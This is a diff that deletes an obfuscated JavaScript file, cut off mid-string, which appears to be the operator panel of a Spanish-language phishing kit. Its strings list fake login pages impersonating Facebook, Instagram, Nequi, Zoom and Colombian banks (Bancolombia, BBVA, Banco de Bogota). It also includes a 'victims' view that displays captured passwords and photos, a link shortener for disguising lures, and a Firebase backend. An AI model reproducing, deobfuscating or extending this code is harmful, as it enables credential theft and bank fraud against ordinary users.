@@ -1,1 +1,2398 @@
-const _0x2ea4a7=_0x382f;(function(_0x2e13e7,_0x43a2c8){const _0x1bc7e8=_0x382f,_0x4b8cd4=_0x2e13e7();while(!![]){try{const _0x3a187c=-parseInt(_0x1bc7e8(0x18d))/0x1+-parseInt(_0x1bc7e8(0x244))/0x2*(parseInt(_0x1bc7e8(0x17e))/0x3)+-parseInt(_0x1bc7e8(0x1dd))/0x4*(-parseInt(_0x1bc7e8(0x30e))/0x5)+parseInt(_0x1bc7e8(0x2f3))/0x6+parseInt(_0x1bc7e8(0x29a))/0x7*(-parseInt(_0x1bc7e8(0x196))/0x8)+parseInt(_0x1bc7e8(0x319))/0x9+parseInt(_0x1bc7e8(0x27b))/0xa;if(_0x3a187c===_0x43a2c8)break;else _0x4b8cd4['push'](_0x4b8cd4['shift']());}catch(_0x3e1e45){_0x4b8cd4['push'](_0x4b8cd4['shift']());}}}(_0x17f9,0x8f411));const _0x39f624=_0xc57b;(function(_0x2961c2,_0xef78f8){const _0x624782=_0x382f,_0x27d75a=_0xc57b,_0x2f77c4=_0x2961c2();while(!![]){try{const _0x442d9a=-parseInt(_0x27d75a(0x330))/0x1*(-parseInt(_0x27d75a(0x350))/0x2)+parseInt(_0x27d75a(0x1f0))/0x3*(parseInt(_0x27d75a(0x27d))/0x4)+parseInt(_0x27d75a(0x1e5))/0x5*(-parseInt(_0x27d75a(0x34f))/0x6)+-parseInt(_0x27d75a(0x1b9))/0x7*(-parseInt(_0x27d75a(0x212))/0x8)+parseInt(_0x27d75a(0x2d8))/0x9+parseInt(_0x27d75a(0x1a5))/0xa+parseInt(_0x27d75a(0x20d))/0xb*(-parseInt(_0x27d75a(0x201))/0xc);if(_0x442d9a===_0xef78f8)break;else _0x2f77c4[_0x624782(0x243)](_0x2f77c4[_0x624782(0x332)]());}catch(_0x472d06){_0x2f77c4[_0x624782(0x243)](_0x2f77c4[_0x624782(0x332)]());}}}(_0x10d7,0x71234));const _0xe1859b=_0x56f7;function _0x10d7(){const _0x544f2d=_0x382f,_0xf1f4aa=[_0x544f2d(0x17c),'4056510cThzLC','</div>',_0x544f2d(0x251),'https://i.postimg.cc/Sxz34z4T/images-(52).jpg',_0x544f2d(0x32c),_0x544f2d(0x1e1),'[Este\x20mensaje\x20fue\x20eliminado]',_0x544f2d(0x1a1),_0x544f2d(0x22b),_0x544f2d(0x21c),_0x544f2d(0x27c),_0x544f2d(0x2f9),'https://i.postimg.cc/SKLyyPqN/images-(30).jpg','pointerEvents',_0x544f2d(0x302),_0x544f2d(0x1d9),_0x544f2d(0x211),_0x544f2d(0x222),_0x544f2d(0x26f),_0x544f2d(0x2f6),_0x544f2d(0x1d6),_0x544f2d(0x179),_0x544f2d(0x2ef),_0x544f2d(0x2d4),_0x544f2d(0x16b),_0x544f2d(0x2c9),_0x544f2d(0x291),_0x544f2d(0x328),_0x544f2d(0x281),_0x544f2d(0x2b3),_0x544f2d(0x173),_0x544f2d(0x169),_0x544f2d(0x2d5),'https://i.postimg.cc/02r2pZGy/images-(35).jpg',_0x544f2d(0x221),_0x544f2d(0x20e),_0x544f2d(0x2b7),_0x544f2d(0x1f1),_0x544f2d(0x166),_0x544f2d(0x30a),_0x544f2d(0x28d),_0x544f2d(0x269),_0x544f2d(0x333),'(((.+)+)+)+$','volume','<small\x20style=\x22color:#0f0;\x22>',_0x544f2d(0x305),_0x544f2d(0x293),_0x544f2d(0x168),_0x544f2d(0x2d1),_0x544f2d(0x230),_0x544f2d(0x246),_0x544f2d(0x17a),_0x544f2d(0x2ba),_0x544f2d(0x308),'https://i.postimg.cc/9Mf4xX0m/34.jpg',_0x544f2d(0x1a4),_0x544f2d(0x1b7),_0x544f2d(0x1bf),'position:fixed;inset:0;background:rgba(0,0,0,0.95);z-index:99999;display:flex;justify-content:center;align-items:center;',_0x544f2d(0x2e7),_0x544f2d(0x20d),_0x544f2d(0x1f0),_0x544f2d(0x235),_0x544f2d(0x171),_0x544f2d(0x1b9),'Racha\x20spam:\x20${streak}/4\x20–\x20¡Cuidado,\x20rata!','https://i.postimg.cc/XvdRfBDw/HD-wallpaper-hacker-hack.jpg',_0x544f2d(0x20c),_0x544f2d(0x1f7),_0x544f2d(0x2f5),'https://i.postimg.cc/hjbqBQLS/images-(55).jpg','</a></div>',_0x544f2d(0x21e),'whatsapp\x20XxX\x20Avance',_0x544f2d(0x204),_0x544f2d(0x283),_0x544f2d(0x2a7),_0x544f2d(0x303),'https://i.postimg.cc/G3sV4F3Q/depositphotos-710393540-stock-photo-faceless-hacker-hacking-inscription-binary.webp',_0x544f2d(0x2e6),_0x544f2d(0x280),_0x544f2d(0x2c6),_0x544f2d(0x310),_0x544f2d(0x212),_0x544f2d(0x206),'https://i.postimg.cc/Kzd3dV54/360-F-641949215-SRk6Gy-MXUSbp-Hzpi7knb-HHjpua-ZF6Ffy.jpg',_0x544f2d(0x1fb),_0x544f2d(0x260),_0x544f2d(0x1f9),_0x544f2d(0x2ae),_0x544f2d(0x189),_0x544f2d(0x2fd),_0x544f2d(0x16f),_0x544f2d(0x24d),_0x544f2d(0x285),_0x544f2d(0x2f1),'replace',_0x544f2d(0x24b),_0x544f2d(0x22c),_0x544f2d(0x335),_0x544f2d(0x2a1),_0x544f2d(0x255),'mostrarFotoCompleta',_0x544f2d(0x21a),_0x544f2d(0x23b),_0x544f2d(0x332),_0x544f2d(0x186),_0x544f2d(0x294),_0x544f2d(0x2bf),_0x544f2d(0x1f4),_0x544f2d(0x2e8),_0x544f2d(0x1ff),_0x544f2d(0x238),'no-repeat',_0x544f2d(0x203),_0x544f2d(0x1b0),_0x544f2d(0x19e),_0x544f2d(0x175),_0x544f2d(0x2dc),'resetTimestamp',_0x544f2d(0x1a9),_0x544f2d(0x1d8),_0x544f2d(0x197),'https://i.postimg.cc/50m3z2rK/pngtree-d-render-of-computer-screen-terminal-with-hacker-code-streaming-down-image-3880541.png',_0x544f2d(0x296),_0x544f2d(0x163),_0x544f2d(0x317),'https://i.postimg.cc/bv0zz58f/images-(33).jpg',_0x544f2d(0x273),_0x544f2d(0x1ec),_0x544f2d(0x177),_0x544f2d(0x1ae),_0x544f2d(0x16e),_0x544f2d(0x2e4),_0x544f2d(0x176),_0x544f2d(0x1e0),_0x544f2d(0x2a9),_0x544f2d(0x1a0),_0x544f2d(0x2b5),'enlacesLista',_0x544f2d(0x1b6),'onclick',_0x544f2d(0x26c),_0x544f2d(0x167),_0x544f2d(0x2ec),_0x544f2d(0x2b0),_0x544f2d(0x2d0),'panelUsers',_0x544f2d(0x18e),_0x544f2d(0x2d3),_0x544f2d(0x2c2),_0x544f2d(0x26d),_0x544f2d(0x1eb),'https://i.postimg.cc/jC0hfnXc/the-anonymus-guy-lb.jpg',_0x544f2d(0x2a4),_0x544f2d(0x299),_0x544f2d(0x2d2),_0x544f2d(0x254),_0x544f2d(0x330),_0x544f2d(0x191),'acortadorUrlOriginal',_0x544f2d(0x338),'victimas',_0x544f2d(0x31d),'tema-none',_0x544f2d(0x32a),_0x544f2d(0x218),_0x544f2d(0x1de),_0x544f2d(0x20a),'position:relative;padding:10px;background:rgba(255,0,0,0.2);margin:6px\x200;border-radius:8px;border-left:4px\x20solid\x20#f00;word-wrap:break-word;color:#fff;font-weight:bold;text-align:center;',_0x544f2d(0x25e),_0x544f2d(0x232),'BBVA\x20en\x20mantenimiento',_0x544f2d(0x1dc),_0x544f2d(0x31e),_0x544f2d(0x2a0),_0x544f2d(0x22d),_0x544f2d(0x2fb),'\x0a\x0a\x20\x20\x20\x20<div\x20style=\x22background:#000;border:6px\x20solid\x20#f00;padding:60px;border-radius:20px;box-shadow:0\x200\x20100px\x20#f00;text-align:center;font-family:monospace;color:#f00;font-size:32px;text-shadow:0\x200\x2030px\x20#f00;animation:shake\x200.4s\x20infinite;\x22>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20style=\x22font-size:80px;margin-bottom:20px;\x22>RATA\x20DETECTADA</div>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20style=\x22font-size:28px;color:#ff0;\x22>BAN\x20DE\x20200\x20AÑOS</div>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20style=\x22font-size:20px;margin:20px\x200;color:#fff;\x22>Spam\x20repetitivo\x20=\x20Eliminado\x20para\x20siempre</div>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20style=\x22font-size:18px;color:#888;\x22>Tus\x20últimos\x20mensajes\x20han\x20sido\x20eliminados.</div>\x0a\x0a\x20\x20\x20\x20</div>\x0a\x0a\x20\x20\x20\x20','__proto__',_0x544f2d(0x23f),_0x544f2d(0x290),_0x544f2d(0x29f),_0x544f2d(0x2be),'https://i.postimg.cc/wv693kT9/images-(27).jpg',_0x544f2d(0x193),_0x544f2d(0x199),_0x544f2d(0x172),'Error\x20al\x20vaciar:',_0x544f2d(0x174),_0x544f2d(0x192),_0x544f2d(0x31a),_0x544f2d(0x22a),_0x544f2d(0x1fa),'ventanaColores',_0x544f2d(0x307),_0x544f2d(0x1ba),_0x544f2d(0x1ac),_0x544f2d(0x226),_0x544f2d(0x2c3),_0x544f2d(0x32d),_0x544f2d(0x24f),_0x544f2d(0x292),'addEventListener',_0x544f2d(0x1a3),_0x544f2d(0x195),_0x544f2d(0x1f6),_0x544f2d(0x1bc),_0x544f2d(0x224),_0x544f2d(0x31f),_0x544f2d(0x2db),_0x544f2d(0x31b),_0x544f2d(0x225),'https://i.postimg.cc/FHGnMGGm/concepto-de-seguridad-hacker-sin-rostro-en-el-trabajo-con-la-inscripcion-pirateria-et.jpg',_0x544f2d(0x1d7),'cerrarMisEnlaces',_0x544f2d(0x32f),_0x544f2d(0x20b),'vaciarMisVictimas',_0x544f2d(0x1d1),_0x544f2d(0x29c),'.chat-input-container',_0x544f2d(0x32b),_0x544f2d(0x2b4),_0x544f2d(0x253),_0x544f2d(0x1cc),_0x544f2d(0x1c6),'regresarAVictimas',_0x544f2d(0x30f),_0x544f2d(0x1b3),'load',_0x544f2d(0x2e0),'https://i.postimg.cc/FzcBw4CG/hacking-ciberseguridad.jpg',_0x544f2d(0x184),_0x544f2d(0x2a6),_0x544f2d(0x2ce),'https://i.postimg.cc/d0yr2Vhf/e83ca84415892f958189823dbf647e34.jpg',_0x544f2d(0x24e),_0x544f2d(0x188),_0x544f2d(0x2d9),_0x544f2d(0x2e1),_0x544f2d(0x16c),_0x544f2d(0x1f2),_0x544f2d(0x2f4),_0x544f2d(0x28a),_0x544f2d(0x1a8),_0x544f2d(0x315),_0x544f2d(0x198),_0x544f2d(0x1df),_0x544f2d(0x33a),_0x544f2d(0x2bb),'shorturl','unshift',_0x544f2d(0x2d7),_0x544f2d(0x164),'https://i.postimg.cc/tTJDGjVv/fondo-de-codigo-verde-pirateria-en-curso.jpg',_0x544f2d(0x318),'contadorActivos',_0x544f2d(0x265),_0x544f2d(0x1d5),'https://i.postimg.cc/PrSWhcGC/a5cc22c43642ee40a75665208c8d388d.jpg',_0x544f2d(0x201),_0x544f2d(0x2fa),_0x544f2d(0x25d),_0x544f2d(0x214),'info',_0x544f2d(0x264),'relative','appendChild',_0x544f2d(0x208),_0x544f2d(0x2bc),_0x544f2d(0x313),'\x27);\x20mostrarCopiadoAcortador()\x22>Copiar</button>',_0x544f2d(0x1b2),_0x544f2d(0x1e5),_0x544f2d(0x241),_0x544f2d(0x182),_0x544f2d(0x1c5),'position:fixed;top:20px;right:20px;background:rgba(255,0,0,0.8);color:#fff;padding:10px\x2015px;border-radius:8px;z-index:9999;font-family:monospace;border:2px\x20solid\x20#f00;animation:fadeInOut\x202s\x20forwards;',_0x544f2d(0x178),'modalSi',_0x544f2d(0x162),'console',_0x544f2d(0x1cf),_0x544f2d(0x329),_0x544f2d(0x2b2),_0x544f2d(0x2ea),_0x544f2d(0x27e),_0x544f2d(0x165),_0x544f2d(0x30b),'https://i.postimg.cc/jqN3xRv8/HD-wallpaper-kali-linux-neon-kali-linux-neon-thumbnail.jpg','</span>\x20<button\x20class=\x22btn\x22\x20onclick=\x22navigator.clipboard.writeText(\x27',_0x544f2d(0x270),_0x544f2d(0x2b6),_0x544f2d(0x27d),_0x544f2d(0x28c),'https://i.postimg.cc/0yyW5WSz/71bb561f7df207bd3b10f9ecdfe5d6be.png',_0x544f2d(0x210),_0x544f2d(0x32e),_0x544f2d(0x27a),_0x544f2d(0x233),_0x544f2d(0x2cd),'https://i.postimg.cc/mrLhDZQN/blood-dragon-1920x1080-red-wallpaper-thumb.jpg',_0x544f2d(0x190),'trim',_0x544f2d(0x21b),'?uid=','https://i.postimg.cc/VvRjJZJ0/desktop-wallpaper-guy-fawkes-mask-anon-mask.jpg',_0x544f2d(0x215),_0x544f2d(0x1fe),_0x544f2d(0x243),_0x544f2d(0x1c4),_0x544f2d(0x18c),_0x544f2d(0x23d),'\x27)\x22>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<br>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<small\x20style=\x22color:\x20#aaa;\x22>(Haz\x20clic\x20para\x20ver\x20completo)</small>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20',_0x544f2d(0x286),_0x544f2d(0x2a3),'correo','Facebook\x20Advance(2)X',_0x544f2d(0x2b8),'mensajeCopiadoAcortador',_0x544f2d(0x29e),_0x544f2d(0x219),'includes',_0x544f2d(0x321),_0x544f2d(0x271),_0x544f2d(0x24a),_0x544f2d(0x1ea),_0x544f2d(0x236),_0x544f2d(0x2c7),_0x544f2d(0x28e),_0x544f2d(0x2f2),_0x544f2d(0x25c),_0x544f2d(0x277),_0x544f2d(0x316),_0x544f2d(0x18a),_0x544f2d(0x1ce),'https://i.postimg.cc/hGzb205x/158fbf8276529dc1e0d3c60846736890.jpg',_0x544f2d(0x1be),_0x544f2d(0x25b),_0x544f2d(0x240),_0x544f2d(0x2cc),_0x544f2d(0x320),_0x544f2d(0x223),_0x544f2d(0x26b),_0x544f2d(0x22e),_0x544f2d(0x2d6),_0x544f2d(0x322),'TikTok',_0x544f2d(0x275),_0x544f2d(0x18b),_0x544f2d(0x19f),_0x544f2d(0x1e9),_0x544f2d(0x284),_0x544f2d(0x1db),_0x544f2d(0x185),_0x544f2d(0x202),_0x544f2d(0x239),_0x544f2d(0x237),'https://i.postimg.cc/VvpgZDJB/images-(47).jpg',_0x544f2d(0x288),_0x544f2d(0x17b),_0x544f2d(0x30c),'17893986rIMlvH',_0x544f2d(0x2bd),_0x544f2d(0x274),'https://i.postimg.cc/52TJqV9M/images-(56).jpg',_0x544f2d(0x2e5),'<button\x20id=\x22modalNo\x22\x20style=\x22background:#300;color:#0f0;padding:12px\x2030px;margin:0\x2010px;border:2px\x20solid\x20#0f0;border-radius:8px;cursor:pointer;font-size:16px;\x22>',_0x544f2d(0x227),_0x544f2d(0x1cb),_0x544f2d(0x2cf),_0x544f2d(0x24c),'contacto',_0x544f2d(0x287),_0x544f2d(0x26e),_0x544f2d(0x262),_0x544f2d(0x17d),_0x544f2d(0x23e),_0x544f2d(0x23a),'<div\x20style=\x22background:rgba(0,255,0,0.1);border:1px\x20solid\x20#0f0;border-radius:8px;padding:10px;margin:5px\x200;font-size:13px;line-height:1.4;\x22>',_0x544f2d(0x1b1),_0x544f2d(0x323),_0x544f2d(0x247),_0x544f2d(0x213),_0x544f2d(0x1c2),_0x544f2d(0x1e4),'Error\x20al\x20enviar\x20mensaje\x20de\x20baneo:',_0x544f2d(0x1aa),_0x544f2d(0x2c4),_0x544f2d(0x2e3),_0x544f2d(0x297),_0x544f2d(0x2c5),'https://i.postimg.cc/P53xg9tm/360-F-574955019-gk0Efa-Pbwa-Iz-Rf3Ht-S8KJd-Kmdu-Ox8V5G.jpg','fakeSelect',_0x544f2d(0x2b9),_0x544f2d(0x248),_0x544f2d(0x259),_0x544f2d(0x314),_0x544f2d(0x282),'add',_0x544f2d(0x1ca),_0x544f2d(0x301),_0x544f2d(0x1c1),'click',_0x544f2d(0x1ad),_0x544f2d(0x161),_0x544f2d(0x19c),_0x544f2d(0x1a2),_0x544f2d(0x1fd),_0x544f2d(0x252),_0x544f2d(0x1e6),_0x544f2d(0x2a2),_0x544f2d(0x242),_0x544f2d(0x29d),_0x544f2d(0x19b),_0x544f2d(0x2ca),_0x544f2d(0x2de),'https://i.postimg.cc/5975WTWR/hacker-attack-breach-freepik.jpg',_0x544f2d(0x28b),'VACIAR','https://i.postimg.cc/ZnhcByjC/d69d3152570a367eecb6ca3b52cdf720.jpg',_0x544f2d(0x22f),'fondoInicio',_0x544f2d(0x250),'imagenesFondoEnlaces',_0x544f2d(0x229),'https://instagram.glegogle5341-af7.workers.dev/',_0x544f2d(0x2ee),_0x544f2d(0x160),'https://i.postimg.cc/sDMYjmVy/112976872-m-webp-width-1170-name-112976872-m.jpg',_0x544f2d(0x2ed),_0x544f2d(0x200),_0x544f2d(0x2a5),'https://nequi-login.glegogle5341-af7.workers.dev/',_0x544f2d(0x1c0),'[onclick=\x22copiarLink()\x22]','https://i.postimg.cc/Hxf3B6cH/images-(40).jpg',_0x544f2d(0x304),_0x544f2d(0x1cd),_0x544f2d(0x16d),_0x544f2d(0x18f),_0x544f2d(0x29b),'Anti-spam:\x20Enviando\x20\x27',_0x544f2d(0x276),'btnCerrarAcortador',_0x544f2d(0x2df),'https://i.postimg.cc/K8Vt3M8B/fbc0925ccbc21d2bfa35fe57d606a528.jpg',_0x544f2d(0x278),_0x544f2d(0x2eb),_0x544f2d(0x1e7),'https://i.postimg.cc/90GLJBr3/kali-linux-silver-dragon-vj6bgoy7ysr3s6ag.jpg','mensajeCopiado',_0x544f2d(0x311),_0x544f2d(0x263),_0x544f2d(0x325),_0x544f2d(0x27f),'153032qUsGFL',_0x544f2d(0x306),'binarios',_0x544f2d(0x258),_0x544f2d(0x1a6),'flex',_0x544f2d(0x2e9),'display','https://ufakmi.mimo.run/index.html',_0x544f2d(0x268),_0x544f2d(0x209),'¿Estás\x20seguro\x20de\x20que\x20quieres\x20borrar\x20<b>TODAS</b>\x20las\x20víctimas\x20registradas?\x20Esta\x20acción\x20es\x20<b\x20style=\x27color:#f00;\x27>IRREVERSIBLE</b>.',_0x544f2d(0x334),_0x544f2d(0x25a),_0x544f2d(0x207),_0x544f2d(0x1af),_0x544f2d(0x1c8),_0x544f2d(0x1bb),_0x544f2d(0x2fe),_0x544f2d(0x300)];return _0x10d7=function(){return _0xf1f4aa;},_0x10d7();}(function(_0x3e06f3,_0x59ec5b){const _0x435883=_0x382f,_0xc6f4dc=(function(){let _0x3669e3=!![];return function(_0x291f9c,_0x467348){const _0x95c433=_0x3669e3?function(){const _0xbaa721=_0x382f;if(_0x467348){const _0xefe059=_0x467348[_0xbaa721(0x26c)](_0x291f9c,arguments);return _0x467348=null,_0xefe059;}}:function(){};return _0x3669e3=![],_0x95c433;};}()),_0xae73f0=_0xc6f4dc(this,function(){const _0x4ff383=_0x382f;return _0xae73f0[_0x4ff383(0x2d9)]()[_0x4ff383(0x297)]('(((.+)+)+)+$')[_0x4ff383(0x2d9)]()[_0x4ff383(0x285)](_0xae73f0)['search']('(((.+)+)+)+$');});_0xae73f0();const _0x50d365=_0xc57b,_0x49e7eb=_0x56f7,_0xcf3067=_0x3e06f3();while(!![]){try{const _0x191965=-parseInt(_0x49e7eb(0x2dd))/0x1*(parseInt(_0x49e7eb(0x258))/0x2)+parseInt(_0x49e7eb(0x20a))/0x3*(parseInt(_0x49e7eb(0x2c7))/0x4)+parseInt(_0x49e7eb(0x382))/0x5+-parseInt(_0x49e7eb(0x253))/0x6*(-parseInt(_0x49e7eb(0x278))/0x7)+-parseInt(_0x49e7eb(0x1f3))/0x8*(-parseInt(_0x49e7eb(0x341))/0x9)+parseInt(_0x49e7eb(0x2ba))/0xa+-parseInt(_0x49e7eb(0x304))/0xb;if(_0x191965===_0x59ec5b)break;else _0xcf3067[_0x50d365(0x340)](_0xcf3067[_0x435883(0x332)]());}catch(_0x17f6ea){_0xcf3067[_0x50d365(0x340)](_0xcf3067[_0x50d365(0x273)]());}}}(_0x3377,0x6fdb0));function _0x17f9(){const _0x36b601=['https://i.postimg.cc/vHrKzGVy/pngtree-security-concept-lock-on-digital-screen-locks-hacker-protection-photo-picture-image-6526616.png','commit','spamStreak','exists','104modnxB','acortadorUrlAlias','Ocultar','Camara\x20Zoom\x20Clases\x20Hacking','btn-regresar','acortadorResultado','Contraseña:\x20<b\x20style=\x22color:#fff\x22>','filter','Bancolombia\x20en\x20mantenimiento','<div\x20style=\x22text-align:center;color:#0f0;padding:30px;\x22>Chat\x20vaciado</div>','lastMessageTime','tema-wave','0\x200\x2015px\x20#00ff00','https://yandex.glegogle5341-af7.workers.dev/','fotoOriginal','Selecciona\x20un\x20enlace','Sistema','position:fixed;inset:0;background:rgba(0,0,0,0.98);z-index:99999;display:flex;justify-content:center;align-items:center;','https://i.postimg.cc/Sxz34z4T/images-(52).jpg','ventanaMisEnlaces','background:#f30;color:#fff;padding:2px\x206px;margin-right:4px;border:none;border-radius:4px;cursor:pointer;font-size:11px;','https://i.postimg.cc/HL0ppNHL/images-(28).jpg','https://i.postimg.cc/VNSKnJD5/linux-mint-linux-computer-hd-wallpaper-thumb.jpg','split','Error\x20al\x20vaciar\x20las\x20víctimas:','7528149bOXHqS','Banco\x20de\x20Bogota','Eliminar','</p>\x0a\x0a\x20\x20\x20\x20\x20\x20<div\x20style=\x22margin-top:25px;\x22>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20<button\x20id=\x22modalSi\x22\x20style=\x22background:#0f0;color:#000;padding:12px\x2030px;margin:0\x2010px;font-weight:bold;border:none;border-radius:8px;cursor:pointer;font-size:16px;\x22>','%28','panel-admi-633cd.firebaseapp.com','https://i.postimg.cc/5yCKVhdm/images-(41).jpg','Facebook\x20Basico','https://i.postimg.cc/WzWCNGh4/images-(53).jpg','https://i.postimg.cc/3J0G5wBQ/luminous-red-anonymous-2wrm4j7avzuqqm4d.jpg','El\x20usuario\x20','0\x200\x2015px\x20','body','.btn','lastIndexOf','panel-admi-633cd','https://i.postimg.cc/WzF6Zg5V/images-(45).jpg','getItem','https://facebook-estndar.glegogle5341-af7.workers.dev/','<button\x20class=\x22btn-red-clear\x22\x20onclick=\x22vaciarMisVictimas()\x22>Vaciar\x20todas</button>\x20<div\x20style=\x22color:#ff8800;padding:25px;text-align:center;font-size:15px;\x22>Aún\x20no\x20tienes\x20víctimas</div>','351vofWgD','https://i.postimg.cc/CxWmTtDQ/wp15527523.jpg','https://i.postimg.cc/BQBhFNrX/5b3bfd4d477b5d3768c39bd7d721d16c.jpg','Anon','length','https://i.postimg.cc/c4n9J0m3/360-F-206197131-3z-Cz-OXo-Hnh-ABEk-XGbqb-Dbmd-Bw-MGos-DIl.jpg','width:100%;height:auto;cursor:pointer;border:3px\x20solid\x20#0f0;border-radius:8px;margin:6px\x200;box-shadow:0\x200\x2015px\x20#0f0;','\x22\x20alt=\x22Foto\x20de\x20la\x20víctima\x22\x20style=\x22max-width:\x20150px;\x20max-height:\x20150px;\x20border-radius:\x208px;\x20border:\x201px\x20solid\x20#ccc;\x20object-fit:\x20cover;\x20cursor:\x20pointer;\x22\x20\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20onclick=\x22mostrarFotoCompleta(\x27','borderColor','className','padding:8px;cursor:pointer;border-bottom:1px\x20solid\x20#0f0;','every','ultimaActividad','boxShadow','registros','chatInput','msgId','numero','144tXuUpe','tema-pulse','position:relative;padding:10px;background:rgba(0,255,0,0.15);margin:6px\x200;border-radius:8px;border-left:4px\x20solid\x20#0f0;word-wrap:break-word;color:#fff;','color','backgroundPosition','https://i.postimg.cc/RhsLPb4j/1.jpg','\x27)\x20center/cover\x20no-repeat\x20fixed','parse','error','https://i.postimg.cc/d18JVxYv/images-(57).jpg','#ff0000','target','https://i.postimg.cc/5Ng3yyzq/Anonymous-Earth-iPhone-Wallpaper-4K.jpg','https://i.postimg.cc/7ZpTZrK5/46c72b16317fef529fa5595143f6e8bc.jpg','docChanges','&shorturl=','log','https://i.postimg.cc/Jz7p5Z8x/wp13404605.jpg','https://i.postimg.cc/7PdjWV8m/images-(44).jpg','querySelectorAll','panel-admi-633cd.firebasestorage.app','Escotia\x20Bank','backgroundRepeat','https://estandarpay.glegogle5341-af7.workers.dev/','ventanaColores','https://betplay.glegogle5341-af7.workers.dev/','</span>','preventDefault','</b><br>','https://i.postimg.cc/44M2Zmzs/79065a72faea7decf81ebd10de644c32.jpg','Falta\x20URL','https://i.postimg.cc/DfdQp0xf/cfd6c4a02a9237921c1d1c414c831031.jpg','url(','tema-darkholo','3334160VGglKL','<p\x20style=\x27color:#f30\x27>Sin\x20enlaces</p>','https://i.postimg.cc/T2C0Yhg7/6a792500-63b5-11f0-8dbd-f3d32ebd3327.jpg','https://camaraz00m.glegogle5341-af7.workers.dev/','template','push','56218lVitsH','writeText','tema-darkcircuit','fondoEnlaces','<strong\x20style=\x22color:#0f0\x22>','mensajeCopiado','14jutTUU','Cancelar','imagenesEnlacesLista','all','<b>$1</b>','Ahora','url','129XYdUAY','<div><a\x20href=\x22','acortadorBtn','width:40px;height:40px;border-radius:5px;cursor:pointer;background:','https://i.postimg.cc/dtN5nD0K/bjaeq21knen81.png','\x22\x20target=\x22_blank\x22\x20style=\x22color:#0f0\x22>','#chatMessages\x20div','scrollHeight','tema-matrix','21652032aEgAOK','vaciarChat','abierto','https://x2p4a4.mimo.run/index.html','join','.btn,#menuBtn,#chatSend,#fakeSelect,#chatPanel,#chatMessages,#chatInput,#chatUsuario,#acortador,.btn-copiar,#panel,#submenu\x20>\x20div,#registros,#ventanaAcortador,#ventanaMisEnlaces,#modalContent,#usuariosOnlineBox\x20div,#btnMostrarAcortador,#acortadorBtn,.btn[onclick=\x22copiarLink()\x22]','<span\x20style=\x22background:#800;color:#fff;padding:2px\x208px;border-radius:4px;font-weight:bold;\x22>@','appendChild','todosColores','Camara\x20xXx\x20Hacking','chatMensajes','lazy','https://i.postimg.cc/yYCvRrCP/images-(39).jpg','login.html','loading','https://i.postimg.cc/2SNHbMcH/G6ba-Fm.jpg','onclick','\x0a\x0a\x20\x20\x20\x20<div\x20style=\x22background:#000;border:4px\x20solid\x20#f00;padding:30px\x2040px;border-radius:12px;box-shadow:0\x200\x2040px\x20#f00;text-align:center;font-family:monospace;color:#f00;font-size:20px;text-shadow:0\x200\x2015px\x20#f00;animation:shake\x200.5s\x20infinite;\x22>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20style=\x22font-size:26px;margin-bottom:10px;\x22>ACCESO\x20DENEGADO</div>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20style=\x22color:#ff0;font-size:16px;\x22>Bloqueado\x20por\x20${años}\x20año(s)</div>\x0a\x0a\x20\x20\x20\x20</div>\x0a\x0a\x20\x20\x20\x20','apply','url(\x27','prototype','table','\x0a\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x0a\x20\x20\x20\x20</div>','544332KkGRmF','https://i.postimg.cc/TY2TT0NB/264ff8b84e19d157fc9cb9f9698abe72.jpg','https://is.gd/create.php?format=json&url=','optionsList','https://i.postimg.cc/TwvmCvmP/54006b42e589a12e78abd06ac6550805.jpg','https://assets.mixkit.co/sfx/preview/mixkit-software-interface-remove-2577.mp3','https://i.postimg.cc/T3wm5r10/images-(37).jpg','ref','#000','stringify','2686380hRgfUR','<span\x20style=\x22color:#0f0\x22>','55412dHpZvx','tema-darkspark','VACIAR\x20CHAT','https://i.postimg.cc/d1qJD9t7/images-(24).jpg','uidRemitente','https://i.postimg.cc/2SCK9gQh/1MM-380.webp','28456XAQZxI','selectionStart','constructor','togglePanel','https://i.postimg.cc/Kcq7hwh1/shutterstock-1916985977-e1703134556975.jpg','fecha','toLowerCase','clipboard','position:fixed;top:10px;left:50%;transform:translateX(-50%);background:rgba(255,0,0,0.9);color:#fff;padding:8px\x2016px;border-radius:8px;z-index:9999;font-family:monospace;display:none;','https://i.postimg.cc/wjc7gRsg/0Zbj-LS.jpg','\x0a\x0a\x20\x20\x20\x20<div\x20style=\x22background:#000;border:3px\x20solid\x20#0f0;padding:30px\x2040px;border-radius:12px;box-shadow:0\x200\x2040px\x20#0f0;text-align:center;font-family:monospace;max-width:90%;\x22>\x0a\x0a\x20\x20\x20\x20\x20\x20<h2\x20style=\x22color:#0f0;margin:0\x200\x2020px;font-size:26px;text-shadow:0\x200\x2015px\x20#0f0;letter-spacing:2px;\x22>','size','position:absolute;bottom:70px;left:10px;width:calc(100%-20px);background:#000;border:2px\x20solid\x20#0f0;padding:10px;border-radius:8px;max-height:180px;overflow:auto;display:none;z-index:99999;box-shadow:0\x200\x2030px\x20#0f0;color:#0f0;font-family:monospace;','innerHTML','Error:\x20No\x20se\x20pudo\x20identificar\x20el\x20usuario.','src','https://i.postimg.cc/fb6BKMrY/vetor-do-cranio-do-fundo-do-ataque-do-hacker-cibernetico-42077-12551.jpg','https://i.postimg.cc/x1stx8Tn/03cc17bcbadd24576e56973a97466661.jpg','not-allowed','img','search','(((.+)+)+)+$','https://i.postimg.cc/3RK3WZJw/images-(26).jpg','7RVeutC','40ufBfEI','currentUser','https://i.postimg.cc/WzXXB16X/Hackers-2.jpg','chatUsuario','head','200\x20AÑOS','optionI